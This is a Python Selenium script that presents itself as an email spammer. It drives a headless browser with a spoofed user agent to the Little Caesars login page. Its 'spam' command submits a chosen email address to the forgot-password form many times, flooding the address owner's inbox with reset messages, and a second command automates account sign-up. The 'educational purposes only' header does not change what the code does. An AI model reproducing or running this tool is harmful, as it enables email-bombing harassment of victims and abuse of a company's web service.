# 
# This was made to test the functionality of the website https://www.littlecaesars.com/en-us/
# This was made for educational purposes only.
# Author: @Daulaires / https://www.github.com/Daulaires/LittleCaesarsEmailSpammer
# Date: 2024-05-02
# 

import os
import sys
import logging
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
import time
import argparse

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Redirect stdout and stderr to logging
sys.stdout = logging.StreamHandler(sys.stdout)
sys.stderr = logging.StreamHandler(sys.stderr)

# Initialize counters
successful_clicks = 0
forgot_password_clicks = 0
total_attempts = 0

def test(driver):
    global successful_clicks
    try:
        div = driver.find_element(By.CSS_SELECTOR, '.css-1fpjypo')
        button = div.find_element(By.TAG_NAME, 'button')
        button.click()
        successful_clicks += 1
        return True
    except NoSuchElementException:
        logging.error("Element not found.")
        return False
    
def create_account(driver, email, password):
    try:
        # Wait for the Create Account link to be present
        create_account_link = WebDriverWait(driver, 30).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, 'a[data-testid="login-form__create-account-link"]'))
        )
        create_account_link.click()

        # Wait for the page to load after clicking the link
        WebDriverWait(driver, 30).until(EC.url_changes(create_account_link.get_attribute('href')))

        # Now wait for each form element to be present
        email_input = WebDriverWait(driver, 30).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, 'input[data-testid="createAcct__email"]'))
        )
        password_input = WebDriverWait(driver, 30).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, 'input[data-testid="createAcct__password"]'))
        )
        confirm_password_input = WebDriverWait(driver, 30).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, 'input[data-testid="createAcct__confirm-password"]'))
        )
        terms_checkbox = WebDriverWait(driver, 30).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, 'input[data-testid="createAcct__confirm-terms"]'))
        )
        continue_button = WebDriverWait(driver, 30).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, 'button[data-testid="createAcct__continue-button"]'))
        )

        # Fill in the form
        email_input.clear()
        email_input.send_keys(email)
        password_input.clear()
        password_input.send_keys(password)
        confirm_password_input.clear()
        confirm_password_input.send_keys(password)
        terms_checkbox.click()
        time.sleep(1)
        continue_button.click()
        time.sleep(2)
        logging.info("\033[92mRedirected to the create account page and elements are ready.\033[0m")
    except NoSuchElementException:
        logging.error("\033[91mCreate Account link or form elements not found.\033[0m")

def click_forgot_password_link(driver):
    global forgot_password_clicks
    try:
        forgot_password_link = driver.find_element(By.CSS_SELECTOR, 'a[data-testid="login-form__forgot-password-link"]')
        forgot_password_link.click()
        forgot_password_clicks += 1
        logging.info("\033[92mClicked on Forgot Password link.\033[0m")
    except NoSuchElementException:
        logging.error("\033[91mForgot Password link not found.\033[0m")

def enter_email(driver, email):
    try:
        email_input = driver.find_element(By.CSS_SELECTOR, 'input[data-testid="forgotPassword__email"]')
        email_input.clear()
        email_input.send_keys(email)
        logging.info("\033[93mEntered email: {}\033[0m".format(email))
    except NoSuchElementException:
        logging.error("\033[91mEmail input field not found.\033[0m")

# Define subparsers for different commands
parser = argparse.ArgumentParser(description='Automate email spamming.')
subparsers = parser.add_subparsers(dest='command')

# Subparser for the 'spam' command
spam_parser = subparsers.add_parser('spam', help='Spam the email.')
spam_parser.add_argument('email', type=str, help='The email to spam.')
spam_parser.add_argument('times', type=int, help='The number of times to spam the email.', default=1)

# Subparser for the 'create_account' command
create_account_parser = subparsers.add_parser('create_account', help='Create an account.')
create_account_parser.add_argument('email', type=str, help='The email to use for account creation.')
create_account_parser.add_argument('password', type=str, help='The password to use for account creation.')

# Parse arguments
args = parser.parse_args()

# Setup Chrome options
options = webdriver.ChromeOptions()

options.add_argument("--headless")
# Increase the browser window size
options.add_argument("--window-size=1920,1080")
# Disable images
options.add_argument("--blink-settings=imagesEnabled=false")
# Use a specific user agent
options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3")
# Enable JavaScript
options.add_argument("--enable-javascript")

# Specify the path to your ChromeDriver executable
driver = webdriver.Chrome(options=options)

# Navigate to the page
driver.get('https://littlecaesars.com/en-us/login/')

# Handle different commands based on the parsed arguments
if args.command == 'spam':
    # Implement the spam functionality here
    for _ in range(args.times + 2):
        total_attempts += 1
        if test(driver):
            enter_email(driver, args.email)
            time.sleep(1)
        else:
            click_forgot_password_link(driver)
            time.sleep(1)
            enter_email(driver, args.email)
            time.sleep(1)
elif args.command == 'create_account':
    # Implement the create account functionality here
    create_account(driver, args.email, args.password)
else:
    logging.error("Invalid command. Use 'spam' or 'create_account'.")
    sys.exit(1)

# Display statistics
logging.info(f"Website: {driver.current_url}")
logging.info(f"Statistics:")
logging.info(f"Total Attempts: {total_attempts}")
logging.info(f"Successful Clicks: {successful_clicks}")
logging.info(f"Forgot Password Clicks: {forgot_password_clicks}")

driver.quit()
